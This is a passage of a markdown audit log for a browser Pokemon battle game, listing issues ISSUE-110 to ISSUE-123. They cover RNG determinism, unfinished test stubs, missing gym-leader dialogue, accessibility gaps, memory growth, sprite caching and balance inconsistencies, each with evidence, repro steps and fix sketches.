**Repro**: Both `sm` and `storyRngNext` are IIFE-private. `typeof sm === 'object'` is always false here, so the cosmetic-forme roll always uses `Math.random()`.

**Blast radius**: Cosmetic forme assignment (1.5% chance) is non-deterministic across seeded replays. Lower stakes than combat RNG (purely cosmetic) but same root cause; fix together with the other leaks.

**Fix sketch**: Mirror line 13854-13855: read `window.StoryMode.state` for active-ness and use `window.storyRngNext`.

**Verification**: grep confirms no bare `storyRngNext`/`sm` in makeBuild; cosmetic forme reproduces under a fixed seed.

---

## <a id="ISSUE-110"></a> ISSUE-110: 351 it.todo() stubs across 3 move-category test files — cluster enumeration

---
id: ISSUE-110
severity: P2
category: test-gap
anchor_symbol: tests/moves/by-category
current_line_hint: ~30
file: tests/moves/by-category/status.test.js
agents: [test-coverage-filler]
fingerprint: fca6be0da22a
confidence: high
status: open
---

**Title**: 351 it.todo() stubs across 3 move-category test files — cluster enumeration

**Evidence**:

```
File counts (confirmed via grep -nE "^\s*it\.todo\("):
  tests/moves/by-category/status.test.js   = 210 TODOs
  tests/moves/by-category/special.test.js  =  74 TODOs
  tests/moves/by-category/physical.test.js =  67 TODOs
  TOTAL                                    = 351 TODOs

Cluster taxonomy (42 buckets; setup-shape, not move-category):

| cluster id | count | example moves (first 3) |
|---|---|---|
| noop-flavor | 2 | Celebrate, Splash |
| boost-self | 1 | Howl |
| self-boost | 1 | Clanging Scales |
| boost-target | 10 | Aromatic Mist, Captivate, Coaching |
| pure-status-target | 14 | Dark Void, Glare, Grass Whistle |
| pure-volatile-self | 16 | Aqua Ring, Destiny Bond, Focus Energy |
| pure-volatile-foe | 26 | Attract, Confuse Ray, Curse |
| heal | 23 | Floral Healing, Heal Order, Heal Pulse |
| field-side-condition | 15 | Aurora Veil, Crafty Shield, Light Screen |
| field-terrain | 4 | Electric Terrain, Grassy Terrain, Misty Terrain |
| weather-set | 6 | Chilly Reception, Hail, Rain Dance |
| field-pseudo-weather | 8 | Fairy Lock, Gravity, Ion Deluge |
| field-clear | 4 | Court Change, Defog, Haze |
| secondary-status | 13 | Blizzard, Discharge, Heat Wave |
| secondary-boost | 12 | Acid, Bleakwind Storm, Bubble |
| secondary-volatile | 7 | Fiery Wrath, Snore, Sparkling Aria |
| damage-plain | 14 | Burn Up, Doom Desire, Future Sight |
| drain | 2 | Matcha Gotcha, Parabolic Charge |
| fixed-damage | 5 | Dragon Rage, Night Shade, Psywave |
| fractional-hp-damage | 4 | Natures Madness, Ruination, Endeavor |
| variable-power | 22 | Electro Ball, Grass Knot, Pika Papow |
| signature-ohko | 4 | Sheer Cold, Fissure, Guillotine |
| protect-like | 11 | Baneful Bunker, Burning Bulwark, Detect |
| counter-like | 4 | Mirror Coat, Comeuppance, Counter |
| lock-on | 2 | Lock-On, Mind Reader |
| self-effect-special | 4 | Belly Drum, Refresh, Stuff Cheeks |
| pp-reduction | 1 | Spite |
| status-transfer | 1 | Psycho Shift |
| boost-copy-flip | 4 | Flower Shield, Psych Up, Rototiller |
| stat-swap-split | 7 | Guard Split, Guard Swap, Heart Swap |
| ability-manipulation | 6 | Doodle, Entrainment, Role Play |
| type-change | 8 | Camouflage, Conversion, Conversion 2 |
| force-switch-or-trap | 5 | Block, Mean Look, Roar |
| item-manipulation | 4 | Bestow, Recycle, Switcheroo |
| perish-song | 1 | Perish Song |
| final-gambit | 1 | Final Gambit |
| turn-order-helper | 4 | After You, Ally Switch, Quash |
| pivot-or-faint-helper | 3 | Baton Pass, Parting Shot, Teleport |
| meta-move | 10 | Assist, Copycat, Instruct |
| misc-truly-unclassified | 1 | Transform |
| charge | 17 | Electro Shot, Ice Burn, Meteor Beam |
| ally-or-spread-target | 44 | Air Cutter, Astral Barrage, Boomburst |
| SUM | 351 | (reconciled against grep count) |
```

```
NOTE: zero TODOs needed multihit/recoil bucketing — the auto-generator
already filled those. The TODO surface is dominated by:
  - Utility/status moves (volatile + side-condition + heal):  ~115
  - Spread/ally-target damage (skipped in singles harness):    44
  - Variable-power + condition-dependent damage:               36
  - Signature/transform/meta moves:                            ~50
  - Charge moves needing 2-turn runs:                          17
```

**Repro**: `/fix-todo-test <cluster-id>` per cluster (e.g. `/fix-todo-test pure-status-target`). Each invocation should write to `tests/moves/by-category/_drafts/<cluster-id>.test.js`.

**Blast radius**: tests/moves/by-category/* (do not edit existing files; orchestrator promotes drafts after review). The harness file `tests/helpers/load-engine.js` is consumed by every cluster; if it cannot satisfy doubles/spread targets, the `ally-or-spread-target` cluster (44 moves) should be deferred or skipped.

**Fix sketch**: Execute clusters in cheapest-setup order. Recommended order (cheapest to most expensive):

1. `noop-flavor` (2) — no precondition, assert no state change
2. `boost-self` (1), `boost-target` (10) — single-turn, assert stage delta
3. `pure-status-target` (14) — assert `defender.status === 'slp'|'par'|...`
4. `pure-volatile-self` (16), `pure-volatile-foe` (26) — assert volatile applied to user/foe
5. `heal` (23) — pre-damage user, assert HP restored
6. `weather-set` (6), `field-terrain` (4), `field-side-condition` (15), `field-pseudo-weather` (8), `field-clear` (4) — assert field/side state
7. `secondary-status` (13), `secondary-boost` (12), `secondary-volatile` (7) — assert damage dealt; secondary chance assertions should tolerate RNG (run many trials or pin seed)
8. `damage-plain` (14), `drain` (2), `fixed-damage` (5), `fractional-hp-damage` (4), `signature-ohko` (4) — assert HP threshold
9. `variable-power` (22) — set up scaling variable (HP%, weight, level, friendship, status), assert damage scales
10. `protect-like` (11), `counter-like` (4), `lock-on` (2), `self-effect-special` (4), `pp-reduction` (1), `status-transfer` (1) — two-turn setups
11. `boost-copy-flip` (4), `stat-swap-split` (7), `ability-manipulation` (6), `type-change` (8) — two-pokemon state changes
12. `force-switch-or-trap` (5), `item-manipulation` (4), `perish-song` (1), `final-gambit` (1), `turn-order-helper` (4), `pivot-or-faint-helper` (3), `meta-move` (10), `misc-truly-unclassified` (1) — special-case scaffolding (likely partial coverage)
13. `charge` (17) — two-turn runTurn, assert damage on turn 2
14. `ally-or-spread-target` (44) — **LAST**: singles harness almost certainly cannot drive these; expect to mark `it.skip()` or document as deferred

Batch limit per invocation: 25–40 TODOs. Split larger buckets (`ally-or-spread-target` 44 → 2 batches; `pure-volatile-foe` 26 fits in one; `heal` 23 fits in one; `variable-power` 22 fits in one).

**Verification**: Each `/fix-todo-test <cluster-id>` invocation writes `tests/moves/by-category/_drafts/<cluster-id>.test.js` and runs `node --test` on it. The agent emits a follow-up finding noting per-cluster status (passing / partially-failing / bug-discovered). Final reconciliation: `grep -c "it.todo" tests/moves/by-category/*.test.js` should approach zero after all drafts are promoted by the orchestrator.

---

## <a id="ISSUE-111"></a> ISSUE-111: 56 Gym Leaders have no entry in `TRAINER_QUOTES_BY_NAME` — fall through to generic 6-line `Gym Leader` pool

---
id: ISSUE-111
severity: P2
category: inconsistency
anchor_symbol: TRAINER_QUOTES_BY_NAME
current_line_hint: ~29450
file: battle.html
agents: [consistency-auditor]
fingerprint: cbadf67900dd
confidence: high
status: open
---

**Title**: 56 Gym Leaders have no entry in `TRAINER_QUOTES_BY_NAME` — fall through to generic 6-line `Gym Leader` pool

**Evidence**:
```js
// TRAINER_QUOTES_BY_NAME has named intros for Brock/Misty/Lt.Surge/Erika/Koga/Sabrina/Blaine/Giovanni
// only — every other Gym Leader defined in TRAINER_DATA falls back to TRAINER_QUOTES['Gym Leader'].
// Missing: Allister, Bea, Brassius, Brawly, Brycen, Bugsy, Burgh, Byron, Candice, Chuck,
//   Cilan, Clair, Clay, Clemont, Crasher Wake, Drayden, Elesa, Falkner, Fantina, Flannery,
//   Gardenia, Gordie, Grant, Grusha, Iono, Jasmine, Kabu, Katy, Kofu, Korrina, Lenora,
//   Maylene, Melony, Milo, Morty, Nessa, Norman, Olympia, Opal, Piers, Pryce, Raihan,
//   Ramos, Roark, Roxanne, Ryme, Skyla, Tate, Tulip, Valerie, Viola, Volkner, Wattson,
//   Whitney, Winona, Wulfric (56 leaders)
// These all have LEADER_VICTORY_LINES (post-battle) and LEADER_BADGE_REFLECTIONS, but
// no pre-battle voice — they're just "Show me what you've trained for."
```

**Repro**: Story run, reach Falkner / Roark / Wattson / Raihan as your gym leader (any non-Kanto first-gen leader). Compare the intro line — it'll be the same generic 6-line pool for every one of them.

**Blast radius**: Cosmetic — the moment-to-moment "fanservice" of a recognisable gym leader is missed. Battle still functions. Same problem the prior audit flagged for Champion victory; the gym intro layer was never extended the same way.

**Fix sketch**: Add 2-3 lines per missing leader to `TRAINER_QUOTES_BY_NAME`, matching the existing tone (one-liner Game Boy-style boasts). The 8 Kanto leaders are the template. ~150 lines of text data.

**Verification**: Manual — start a story run, fight each of the 8 cities' gym leader, eyeball that the intro line reflects the trainer's personality (e.g. Raihan = social media banter, Allister = quiet ghost flavor).

---

## <a id="ISSUE-112"></a> ISSUE-112: Tooltip-only data (type chart, move info, status terms) is `onmousemove`-gated — keyboard & touch get nothing

---
id: ISSUE-112
severity: P2
category: a11y
anchor_symbol: type-badge
current_line_hint: ~14906
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 2c0ca902ef08
confidence: high
status: open
---

**Title**: Tooltip-only data (type chart, move info, status terms) is `onmousemove`-gated — keyboard & touch get nothing

**Evidence**:
```js
// getTypeHTML at ~14906
let html = `<span class="type-badge type-${t1}" onmousemove="window.showTypeTooltip('${t1}', event)" onmouseleave="window.hideTextTooltip()" style="cursor:help;">${t1}</span>`;

// Battle-log move link at ~12958
return `used <span class="log-move-link tip-move-cell" data-mn="${enc}" onclick="…showMoveTooltipTap(…)" onmousemove="…showMoveTooltip(…)" onmouseleave="…">${moveName}</span>!`;
```

The defensive/offensive type chart, raw move stats (BP/Acc/PP/effect), and inline tip-term glossary are *only* surfaced via tooltip. The triggers are `onmousemove` + `onclick` — there is no `onfocus`/`onblur` pair, so keyboard users tabbing through battle log spans get no tooltip even if the element is focusable. Touch users hit the `onclick` "tap mode" branch (good) but only on terms that have an `onclick` handler; many decorative type badges (`getTypeHTML` above) lack one entirely.

**Repro**: Tab to a "burned" / "leech-seeded" status word in the battle log → nothing. Press Enter on a type badge in the foe's stat box → nothing.

**Blast radius**: Type chart is critical learning content. Hover-only delivery makes it inaccessible to keyboard, touch on decorative badges, and many SR users.

**Fix sketch**: For each tooltip helper, mirror `onmousemove` with `onfocus` (using the same handler) and `onmouseleave` with `onblur`. Add `tabindex="0"` + `role="button"` to type badges and tip-term spans that don't already have them. The existing `showFieldTooltipFromData` at line 16034 already uses both `onclick` and `onkeydown` — replicate that pattern globally.

**Verification**: Tab to a type badge → tooltip shows on focus; type chart announces via SR.

---

## <a id="ISSUE-113"></a> ISSUE-113: Long story replay shows steady, non-plateauing heap growth (~22–67 KB/turn, R²=0.99 over 250 battles) driven by per-turn / per-distinct-foe DOM scaffolding that GC + reset() do not reclaim

---
id: ISSUE-113
severity: P2
category: perf
anchor_symbol: updateBattleUI
current_line_hint: 16788
file: battle.html
agents: [performance-profiler]
fingerprint: 3e3792c97f56
confidence: medium
status: open
---

**Title**: Long story replay shows steady, non-plateauing heap growth (~22–67 KB/turn, R²=0.99 over 250 battles) driven by per-turn / per-distinct-foe DOM scaffolding that GC + reset() do not reclaim

**Evidence**: Full story-style replay (roll fresh team + build foes + run turns per battle), jsdom with `--expose-gc`:
```
68 battles  / 408 turns:  heap 85.7 -> 112.2 MB  (+26.5 MB, ~67 KB/turn, ~399 KB/battle)
250 battles/~1500 turns:  heap 85.7 -> 171.2 MB  (+85 MB, R²=0.995)
  first-half slope 0.362 MB/battle  ≈  second-half slope 0.335 MB/battle  (slope does NOT decay)
After loop, reset() + global.gc(): 112.2 -> 112.5 MB (NO drop → retained in detached DOM/closures, not live state)
DOM node count climbed 1210 -> 4365 over 68 battles (player-sprite-container alone: 0 -> ~1415 descendants)
```
Same-mon turn loop in isolation grows only ~22 KB/turn (matches the prior baseline) and sprite-container stays at 9 descendants — the extra growth tracks **distinct foe species** (new sprite `<img>` + per-mon UI scaffolding), not turn count alone.

**Repro**: `node --expose-gc` replay calling `__storyTest.rollTrainerTeam` → `mkMon(slot)` → `runTurn` for ~68 battles, sampling `process.memoryUsage().heapUsed` every 10 battles.

**Blast radius**: This is the headline "will it scale" signal for the redesign. It is **linear, not quadratic** (no algorithmic leak), so it is not a P1 — but it does **not plateau**, so a session spanning a full story + post-game + the planned Fight Club gauntlet (hundreds of battles) trends to hundreds of MB on the JS heap, before counting the separate `_preloadedImages` image-decoder pool. IMPORTANT HONESTY CAVEAT: a large share of the jsdom number is inflated by the harness's anime.js stub — animation-completion callbacks that normally call `el.remove()` on effect/overlay nodes never fire, and `showBattlePopup`/MoveAnimEngine are gated on `settings.animations` (false in tests), so the measured per-turn DOM retention overstates a real browser where those timers/callbacks run. The real, browser-relevant slice is the per-distinct-foe sprite/UI scaffolding + the `_preloadedImages` cache (separate finding).

**Fix sketch**: Audit the per-foe sprite/overlay creation in the battle-UI refresh (sub/protect overlays at battle.html:16788–16808 are guarded; the unbounded growth is new `<img>`/effect nodes per distinct foe). Ensure swapping a battler tears down the prior battler's sprite nodes. Re-measure in a real headless browser (Playwright) with `settings.animations` true to separate the genuine retention from the anime-stub artifact before sizing the fix.

**Verification**: In a Playwright session with animations on, run 100+ battles and confirm `document.querySelectorAll('*').length` and JS heap plateau (slope → 0) rather than climbing linearly.

---

## <a id="ISSUE-114"></a> ISSUE-114: Long story replay shows linear (non-quadratic) heap + DOM-node growth that does not plateau — ~0.275 MB and ~52 sprite-container nodes retained per battle

---
id: ISSUE-114
severity: P2
category: perf
anchor_symbol: updateBattleUI
current_line_hint: ~16854
file: battle.html
agents: [performance-profiler]
fingerprint: 3dc9c4ece2e7
confidence: medium
status: open
---

**Title**: Long story replay shows linear (non-quadratic) heap + DOM-node growth that does not plateau — ~0.275 MB and ~52 sprite-container nodes retained per battle

**Evidence**: Story-style replay (roll fresh team → build 6 foes → run a turn each), jsdom `--expose-gc`, `settings.animations=false`:
```
200 battles: heap 88.8 → 145.3 MB   slope 0.275 MB/battle   R²=0.983
  first-half slope 0.329  ≈  second-half slope 0.214  (slope does NOT increase → LINEAR, not a quadratic leak)
DOM nodes: 1168 → 11520  (+51.76 nodes/battle, dead-linear)
Top growers over 30 battles: #player-sprite-container +93, #foe-sprite-container +60, #screen-battle +13
```
The sub/protect overlays at battle.html:16854–16876 are correctly guarded (querySelector + `.remove()` on clear) so they are NOT the leak; the retained nodes are per-battle sprite/UI scaffolding in the two sprite containers that battle teardown does not reclaim.

**Repro**: `node --expose-gc` replay over 200 battles sampling `process.memoryUsage().heapUsed` + `document.querySelectorAll('*').length` every 20 battles (`/tmp/memlong.mjs`, `/tmp/domsrc.mjs` this session).

**Blast radius**: This is the "will it scale over a long session" signal. It is **linear, not quadratic**, so it is a P2 (steady drip), not a P1 (algorithmic leak). HONESTY CAVEAT: a meaningful share of the jsdom number is harness-shaped — the anime.js stub means animation-completion callbacks that normally call `el.remove()` on effect/overlay nodes never fire, and the move-effect / stat-arrow / pokéball append paths (battle.html:12599, 12627, 16066) are all gated on `settings.animations` (false in tests), so the per-battle DOM retention measured here overstates a real browser where those timers run. The browser-relevant slice (per-distinct-foe sprite scaffolding) needs a Playwright run with animations ON to size precisely.

**Fix sketch**: Audit battle teardown to ensure swapping/ending a battle removes the prior battler's appended sprite/effect nodes from `#player-sprite-container` / `#foe-sprite-container`. Re-measure in headless Chromium (Playwright) with `settings.animations=true` to separate genuine retention from the anime-stub artifact before sizing the fix.

**Verification**: In a Playwright session with animations on, run 100+ battles and confirm `document.querySelectorAll('*').length` and JS heap plateau (slope → 0) rather than climbing linearly.

---

## <a id="ISSUE-115"></a> ISSUE-115: Modals have aria-modal + Escape but no Tab focus trap — keyboard focus can leave the dialog

---
id: ISSUE-115
severity: P3
category: a11y
anchor_symbol: __pbsGlobalEscBound
current_line_hint: ~13019
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 587b740ecf41
confidence: medium
status: open
---

**Title**: Modals have aria-modal + Escape but no Tab focus trap — keyboard focus can leave the dialog

**Evidence**:
```js
document.addEventListener('keydown', function (e) {
    if (e.key !== 'Escape') return;            // Escape closes topmost modal — good
    const modals = document.querySelectorAll('.modal:not(.hidden)');
    // ...no Tab-key containment anywhere...
});
```

**Repro**: Open any modal and press Tab repeatedly. `aria-modal="true"` is advisory only; without a trap, focus walks out to controls on the screen behind the overlay (which is not `inert`/`aria-hidden`), so a sighted keyboard user can operate background controls through the modal.

**Blast radius**: All `.modal` dialogs. Escape-to-close and focus-return are already handled, so this is the remaining piece of correct dialog semantics.

**Fix sketch**: On open, set the background (`#game-stage`/screens) to `inert` or `aria-hidden="true"`; or add a Tab handler that cycles focus within the dialog's focusable set. Pair with the openModal "focus into" fix.

**Verification**: Tab/Shift+Tab stay within the open dialog; background controls are unreachable until close.

---

## <a id="ISSUE-116"></a> ISSUE-116: CONFIRMED CLEAN — PC overflow at party-cap + 30/30 shows explicit message; sell/release path exists

---
id: ISSUE-116
severity: P3
category: bug
anchor_symbol: _catchHandleSuccess
current_line_hint: ~44937
file: battle.html
agents: [story-mode-investigator]
fingerprint: 676d6b1d9871
confidence: high
status: open
---

**Title**: CONFIRMED CLEAN — PC overflow at party-cap + 30/30 shows explicit message; sell/release path exists

**Evidence**:
```js
const maxParty = _storyMaxPartySize();
const partyFull = (sm.team||[]).length >= maxParty;
const pcFull = (sm.pcBox||[]).length >= PC_BOX_CAP;
if (partyFull && pcFull) {
    _catchFinishWithMessage(`Your party (${(sm.team||[]).length}/${maxParty}) and PC (${PC_BOX_CAP}/${PC_BOX_CAP}) are full. Free a slot at the Pokémon Center, then try again.`);
    return;
}
```

**Repro**: `_catchHandleSuccess` (44937) handles party-full+PC-full with an explicit modal directing the player to the Center. Party-full + PC-room offers a swap prompt (`_renderPartySwapPrompt`, 44968). The Center's Underground tab (`pcSell`) and PC `pcRelease` both free slots. Spec §7 satisfied (modulo the help text saying "10/10" — see separate finding).

**Blast radius**: Tier-1 #5 — clean.

**Fix sketch**: None — positive confirmation.

**Verification**: Fill party to cap + PC to 30; throw a successful catch; confirm the modal and that a release/sell then allows the catch.

---

## <a id="ISSUE-117"></a> ISSUE-117: Eggs occupy a party slot against the catch/withdraw cap but foe size matches only non-egg fighters — eggs silently shrink your catchable roster AND your opponent

---
id: ISSUE-117
severity: P3
category: inconsistency
anchor_symbol: _catchHandleSuccess
current_line_hint: ~45261
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4103af534a9a
confidence: medium
status: open
---

**Title**: Eggs occupy a party slot against the catch/withdraw cap but foe size matches only non-egg fighters — eggs silently shrink your catchable roster AND your opponent

**Evidence**:
```js
const maxParty = _storyMaxPartySize();
const partyFull = (sm.team || []).length >= maxParty;   // counts eggs
// vs foe sizing:
const partySize = _storyEnemyPartySize(event, _storyCountFighters() | 0, idx); // fighters only (excludes eggs)
```

**Repro**: After the Daycare egg event, a player carrying eggs (each `isEgg:true`) has them counted in `sm.team.length` for the catch "full" check (`_catchHandleSuccess`, `pcWithdraw` at ~44179) but EXCLUDED from `_storyCountFighters()` used for foe party sizing (~42399) and the proceed/empty checks. So a player with 1 fighter + 2 eggs at a 3-slot cap faces a 1-mon foe (correct-ish) yet cannot catch a new partner (party reads "3/3 full"), and the catch is forced to PC. The two cap interpretations disagree on what a "party slot" is.

**Blast radius**: Mid-game with daycare eggs. Mild — caught mons still land in PC and eggs hatch into the party — but the "you're full, sent to PC" message fires when the player effectively has open fighting slots, which reads as a bug to the player.

**Fix sketch**: Decide one definition of party occupancy. Likely: cap counts ALL slots (eggs included) consistently — then also size foes off `sm.team.length` for parity, OR exclude eggs from the catch-cap so eggs don't block catching. Align `_catchHandleSuccess`/`pcWithdraw` with `_storyEnemyPartySize`.

**Verification**: Carry 2 eggs + 1 fighter at cap 3; attempt a wild catch — confirm the catch-to-party vs catch-to-PC decision matches the intended egg-occupancy rule, and the foe size matches the same rule.

---

## <a id="ISSUE-118"></a> ISSUE-118: `_pickCityQuoteLine` deliberately uses bare `Math.random` — drift across save reloads

---
id: ISSUE-118
severity: P3
category: inconsistency
anchor_symbol: _pickCityQuoteLine
current_line_hint: ~29705
file: battle.html
agents: [consistency-auditor]
fingerprint: 2cc1751d63f6
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `_pickCityQuoteLine` deliberately uses bare `Math.random` — drift across save reloads

**Evidence**:
```js
// L29673-L29706
// City NPC flavor (index = City N from event name). Uses Math.random only — must not advance story battle RNG.
const CITY_PROFESSOR_QUOTES = [ ... ];
const CITY_GUIDE_QUOTES = [ ... ];
function _pickCityQuoteLine(poolArr, cityIdx) {
    const idx = Math.min(Math.max(0, cityIdx|0), poolArr.length - 1);
    const lines = poolArr[idx] || poolArr[0];
    return lines[Math.floor(Math.random() * lines.length)];  // BARE — intentional
}
```

**Repro**: Save in City 4, reload — the professor quote may change between loads. Stated in the file comment as intentional ("must not advance story battle RNG").

**Blast radius**: Intentional behavior, low-impact. Could be made deterministic per (seed, cityIdx, visit-count) without touching the main story RNG stream by mirroring the `_storySideRng` pattern already used for rival secondary intros (L29622-29633). Would make seeded replays even more reproducible.

**Fix sketch**: Replace the bare `Math.random()` with `_storySideRng(cityIdx, sm.eventIndex|0)` so the same city visit at the same point produces the same quote. Keep the existing behavior off the main story RNG stream.

**Verification**: Reload a save twice at the same city event — professor/guide quote should be identical both times.

---

## <a id="ISSUE-119"></a> ISSUE-119: Sprite preloading is unbounded — each `getSprite()` call adds a `new Image()` to a global cache with no eviction; a long story run can preload 1000+ images

---
id: ISSUE-119
severity: P3
category: perf
anchor_symbol: _preloadedImages
current_line_hint: 11983
file: battle.html
agents: [performance-profiler]
fingerprint: 2b9d-imageprefetch
confidence: medium
status: open
---

**Title**: Sprite preloading is unbounded — each `getSprite()` call adds a `new Image()` to a global cache with no eviction; a long story run can preload 1000+ images

**Evidence**:
```js
// battle.html:11982
const _spriteCache = {};
const _preloadedImages = {};
// :12036
if (!_preloadedImages[url]) {
    let img = new Image(); img.src = url; _preloadedImages[url] = img;
}
```
`getSprite()` is called from 44 sites (every battle-UI redraw, every party-screen render, every draft-card render, every PC storage render). Each unique (name, shiny, back) tuple creates an `Image` that holds the GIF in memory. A full story run sees 100–300 unique mons across battles, party screens, PC storage, and trainer previews. Multiply by `shiny` × `back` variants and the cache can easily exceed 500 entries; on a long save (multiple runs) it grows unboundedly.

**Repro**: Greps `grep -c 'new Image()' battle.html` → 1 (the only caller) and `grep -c 'getSprite\s*('` → 44 (the call sites). No eviction logic exists (`grep '_preloadedImages\s*='` shows only the initial `{}` declaration plus the assignment-in-loop).

**Blast radius**: Each GIF sprite from Showdown is ~5–50 KB. 500 cached = ~10–25 MB of image data the browser pins. On low-RAM mobile devices this contributes to mid-session crashes / OOM. The memory-growth benchmark at 60 turns shows only +5 MB heap growth (linear, R² = 0.712), but that's the JS heap — the image cache lives in the browser's image-decoder pool, separate from V8 heap, and would not show up in `process.memoryUsage()`. This finding is a forward-looking risk, not a confirmed regression. Marked P3 / confidence medium.

**Fix sketch**: Convert `_preloadedImages` from an unbounded Object into a bounded LRU cache (e.g., keep last 100 sprites). Alternatively, just remove the `new Image()` preload — modern browsers cache `<img src>` automatically once an `<img>` element is appended; the explicit Image() instances duplicate the cache.

**Verification**: After the fix, `Object.keys(_preloadedImages).length` should plateau in a long story run instead of growing monotonically.

---

## <a id="ISSUE-120"></a> ISSUE-120: Safari curve key [3] ("first unlock") is dead code — Safari actually unlocks at 4 badges, so first visit uses the harsher [4] curve

---
id: ISSUE-120
severity: P3
category: inconsistency
anchor_symbol: _SAFARI_GRADE_CURVE_BY_BADGES
current_line_hint: ~43547
file: battle.html
agents: [story-mode-investigator]
fingerprint: a2bb5974a473
confidence: high
status: open
---

**Title**: Safari curve key [3] ("first unlock") is dead code — Safari actually unlocks at 4 badges, so first visit uses the harsher [4] curve

**Evidence**: The Safari Zone action first appears on the hub row labeled `City5` (STORY_EVENTS_RAW row 28). The player reaches that hub with 4 badges (Gym Leaders 1-4 are behind it). But `_SAFARI_GRADE_CURVE_BY_BADGES` and its comment assume the first visit is at 3 badges — key `3` is labeled "first unlock @ City 4" (g4:35, the gentlest) but is never reached in normal play; the first visit uses key `4` (g4:25). Verified via repro.

**Repro**: `node scripts/debug/_repro/safari-citybadge.mjs` prints "Safari Zone first appears at row index 28 ... Badges the player has when first reaching this hub: 4".

**Blast radius**: Cosmetic/balance only. The intended "gentle first visit" (35% G4) is never delivered. Separately, the in-game help text (battle.html ~10640 / ~10661) and the curve comment say "City 4" while the timeline labels the hub "City5" — a naming inconsistency worth reconciling.

**Fix sketch**: Either open Safari one hub earlier (badges 3), or relabel the curve so key `4` carries the gentle first-visit weights and drop the unreachable `3` entry. Reconcile the City4/City5 naming.

**Verification**: Confirm `_safariGradeWeightsForBadges()` returns the intended first-visit weights at the badge count the player actually has on entry (4).

---

## <a id="ISSUE-121"></a> ISSUE-121: Safari grade weights are now badge-keyed — spec/CODEBASE_MAP still cite the old static g1:3/g2:22/g3:50/g4:25

---
id: ISSUE-121
severity: P3
category: inconsistency
anchor_symbol: _safariGradeWeightsForBadges
current_line_hint: ~43154
file: battle.html
agents: [story-mode-investigator]
fingerprint: ecabacc5ef90
confidence: high
status: open
---

**Title**: Safari grade weights are now badge-keyed — spec/CODEBASE_MAP still cite the old static g1:3/g2:22/g3:50/g4:25

**Evidence**:
```js
// battle.html:43154 — v19 replaced the static weights with a badge curve
const _SAFARI_GRADE_CURVE_BY_BADGES = {
  3: { g1: 0, g2: 5,  g3: 60, g4: 35 },  // first unlock @ City 4
  ...
  8: { g1: 5, g2: 50, g3: 40, g4: 5  }
};
```

**Repro**: STORY_MODE_FLOW §4, CODEBASE_MAP, and the audit mandate all state Safari "weights g1:3/g2:22/g3:50/g4:25". Code comment at 43152 confirms "Pre-v19 was static {g1:3,g2:22,g3:50,g4:25}." The current curve scales with `sm.badges` so the FIRST (free, City-4) Safari visit yields ZERO G2 and zero G1 — a deliberate "real chance at a strong G3" tuning, not the documented haul.

**Blast radius**: Spec-vs-code drift only (code is the newer, intentional design). Anyone tuning Safari from the spec would regress it. 6-encounter loop (`SAFARI_MAX_ENCOUNTERS=6`), 15-ball session (`SAFARI_BALLS_PER_SESSION=15`), 1.35× mult all match spec.

**Fix sketch**: Update STORY_MODE_FLOW §4 + CODEBASE_MAP to reference `_SAFARI_GRADE_CURVE_BY_BADGES` as the source of truth. No code change.

**Verification**: Spec table matches the live constant.

---

## <a id="ISSUE-122"></a> ISSUE-122: CONFIRMED CLEAN — catch tutorial fires exactly once; mid-tutorial reload cannot refire or lock

---
id: ISSUE-122
severity: P3
category: bug
anchor_symbol: _shouldFireCatchTutorialBeforeBattle
current_line_hint: ~44996
file: battle.html
agents: [story-mode-investigator]
fingerprint: df15067e7f6b
confidence: high
status: open
---

**Title**: CONFIRMED CLEAN — catch tutorial fires exactly once; mid-tutorial reload cannot refire or lock

**Evidence**:
```js
// Flag set ONLY on actual catch success (44996):
if (_catchState && _catchState.tutorialMode) { _markCatchTutorialDone(); }
// Gate (41454): if (!sm || sm.catchTutorialDone) return false;  + intro-rival-behind check
// Migration (31907): sm.catchTutorialDone = (sm.eventIndex|0) > 1;  for pre-v16 saves
```

**Repro**: `_shouldFireCatchTutorialBeforeBattle` (41453) gates on `!sm.catchTutorialDone`, intro-rival-behind, party<cap, ≥1 ball. `catchTutorialDone` is set by `_markCatchTutorialDone` ONLY inside the catch-success path under `tutorialMode` (44996–45001) — explicitly "so a mid-tutorial reload doesn't lock the once-per-save flag without the partner ever landing." v16 migration back-fills existing saves.

**Blast radius**: Tier-1 #4 — clean. No refire on save/load.

**Fix sketch**: None — positive confirmation.

**Verification**: Reload during the tutorial catch screen; confirm tutorial re-presents (flag not yet set) and does not double-fire after the catch lands.

---

## <a id="ISSUE-123"></a> ISSUE-123: Basic Trainer build-tier ladder collapses at Stage 2 — same tier as Gym Trainers despite the "one tier below" comment

---
id: ISSUE-123
severity: P3
category: balance
anchor_symbol: _storyBuildTierForEvent
current_line_hint: ~33847
file: battle.html
agents: [story-mode-investigator]
fingerprint: 8909d73d953d
confidence: high
status: open
---

**Title**: Basic Trainer build-tier ladder collapses at Stage 2 — same tier as Gym Trainers despite the "one tier below" comment

**Evidence**:
```js
if (e === 'Basic Trainer') {
    // Route fodder sits one tier below the gym trainer of the same stage...
    if (b >= 5) return STORY_BUILD_TIER.NOVICE;   // GymTrainer here = COMPETENT → OK (one below)
    if (b >= 2) return STORY_BUILD_TIER.NOVICE;   // GymTrainer here = NOVICE   → EQUAL, not one below
    return STORY_BUILD_TIER.UNTRAINED;
}
```

**Repro**: At Stage 2 (badges 2–4), `_storyBuildTierForEvent('Gym Trainer 1', _, 2)` = NOVICE (T2) and `_storyBuildTierForEvent('Basic Trainer', _, 2)` = NOVICE (T2) — identical. The function's own comment promises a "wild trainer < gym staff < gym leader" ladder per stage, which holds at Stage 3 (Basic T2 < GymTrainer T3) but breaks at Stage 2 where both are T2. The two redundant Basic branches (`b>=5` and `b>=2` both NOVICE) suggest the `b>=2` line was meant to return UNTRAINED (one below the Stage-2 gym trainer's NOVICE).

**Blast radius**: Build-power curve for route/Basic trainers across the badges-2..4 mid-early game. Basic Trainers feel as tuned as gym staff in that window, flattening the intended difficulty texture. Purely a build-quality (EVs/nature/item) delta, not a crash.

**Fix sketch**: Change the Basic Trainer `b >= 2` branch to `return STORY_BUILD_TIER.UNTRAINED;` so the ladder is Basic(T1) < GymTrainer(T2) < Leader(T2 floor + ace) at Stage 2, matching Stage 3's relationship. Or, if the collapse is intentional, drop the redundant `b>=5` line and fix the comment.

**Verification**: `StoryMode.debugBuildTiers()` matrix — confirm Basic Trainer is strictly below Gym Trainer 1 at every badge count 2..7.

---

